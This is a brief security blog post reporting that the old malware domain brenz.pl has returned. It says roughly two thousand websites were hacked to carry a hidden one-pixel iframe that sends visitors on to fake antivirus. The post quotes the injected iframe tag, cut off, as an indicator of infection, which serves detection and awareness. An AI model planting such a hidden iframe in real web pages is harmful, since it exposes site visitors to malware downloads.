Brenz.pl is Back With Malicious iFrames

We used to see brenz.pl being used to distribute malware back in 2009, and got shut down. However, for the last few weeks we noticed a big increase in the number of sites infected with iframes pointing to it.
All the sites infected have this iframe (or very similar):

<iframe style="height:1px" src="http://www.Brenz.pl/rc/” frameborder=0 wid..

Which redirects the user to another sites to download the unfamous Fake AV. How many sites got infected? According to Google at least 2 thousand sites got hacked in the last 90 days:

Has this site hosted malware?

Has this site hosted malware?
